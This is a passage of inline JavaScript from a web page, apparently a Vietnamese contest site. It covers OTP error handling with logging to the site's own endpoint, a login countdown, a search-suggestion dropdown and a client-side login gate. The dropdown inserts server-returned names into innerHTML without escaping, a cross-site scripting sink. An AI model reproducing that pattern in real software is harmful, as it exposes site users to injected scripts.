          else { toast(j.error || 'OTP không hợp lệ', 'error'); try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'warn', type:'otp_verify_failed', ts: Date.now(), reason: j.error||'invalid' }) }); }catch(_){ } }
        } catch(e){ toast('Lỗi kết nối', 'error'); try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'error', type:'otp_verify_error', ts: Date.now(), reason: (e && e.message)||'network' }) }); }catch(_){ } }
      }

      let __loginCountdownTimer = null;
      function startCountdown(seconds){
        const el = document.getElementById('loginCountdown');
        if (__loginCountdownTimer) clearInterval(__loginCountdownTimer);
        let remain = seconds; el.textContent = remain;
        __loginCountdownTimer = setInterval(()=>{
          remain -= 1; if (remain < 0) { clearInterval(__loginCountdownTimer); return; }
          el.textContent = remain;
        }, 1000);
      }

      (function(){
        const input = document.getElementById('globalSearch');
        const box = document.getElementById('searchSuggest');
        if (!input || !box) return;
        const render = (items)=>{
          if (!items || !items.length) { box.innerHTML=''; box.classList.add('hidden'); return; }
          box.innerHTML = items.slice(0,8).map(it=>`<a href="${it.type==='contestant'?('/contests/'+it.contest_id):('/contests/'+it.id)}" class="block px-3 py-2 hover:bg-white/5">${it.type==='contestant'?'👤':'🏁'} ${it.name}</a>`).join('');
          box.classList.remove('hidden');
        };
        const search = async (q)=>{
          try {
            const r = await secureFetch(`/api/public/search_suggest?q=${encodeURIComponent(q)}&limit=8`);
            const j = await r.json();
            if (!j || j.success === false) { box.classList.add('hidden'); return; }
            const items = [].concat(
              (j.contests||[]).map(x=>Object.assign({type:'contest'}, x)),
              (j.contestants||[]).map(x=>Object.assign({type:'contestant'}, x))
            );
            render(items);
          } catch(e){ box.classList.add('hidden'); }
        };
        const debounced = (fn, w)=>{ let t; return (...a)=>{ clearTimeout(t); t=setTimeout(()=>fn(...a), w); }; };
        input.addEventListener('input', debounced((e)=>{
          const v = input.value.trim(); if (v.length<1) { box.classList.add('hidden'); box.innerHTML=''; return; }
          search(v);
        }, 200));
      })();

      // Global Auth Gate: chặn mọi thao tác khi chưa đăng nhập
      (function(){
        if (window.__LOGGED_IN__) return; // đã đăng nhập thì bỏ qua

        const isExempt = (el)=>{
          // Cho phép nút/mục có class 'auth-exempt' hoặc link về trang chủ
          return el.closest('.auth-exempt') || (el.closest('a') && new URL(el.closest('a').href, location.origin).pathname === '/');
        };

        const guard = (ev)=>{
          const tgt = ev.target;
          if (!tgt) return;
          if (isExempt(tgt)) return;
          // Chỉ can thiệp với thao tác trong phần chính của trang
          const inMain = tgt.closest('main, .container, .interactive-glow, .card, .btn, a, button, form, [data-action]');
          if (!inMain) return;
          ev.preventDefault();
          ev.stopPropagation();
          try { openLoginModal(); } catch(_) { /* fallback */ }
          window.toast && window.toast('Vui lòng đăng nhập để tiếp tục', 'info');
        };

        // Intercept click trên link và button
        document.addEventListener('click', function(e){
          const t = e.target;
          if (!t) return;
          if (t.closest('button, a, [role="button"], .btn')) guard(e);
        }, true);

        // Intercept submit form
        document.addEventListener('submit', function(e){ guard(e); }, true);

        // Intercept Enter trong input bên trong form
        document.addEventListener('keydown', function(e){
          if (e.key === 'Enter') {
            const t = e.target;
            if (t && t.closest('form')) guard(e);
          }
        }, true);
      })();
    </script>
  </body>
</html>
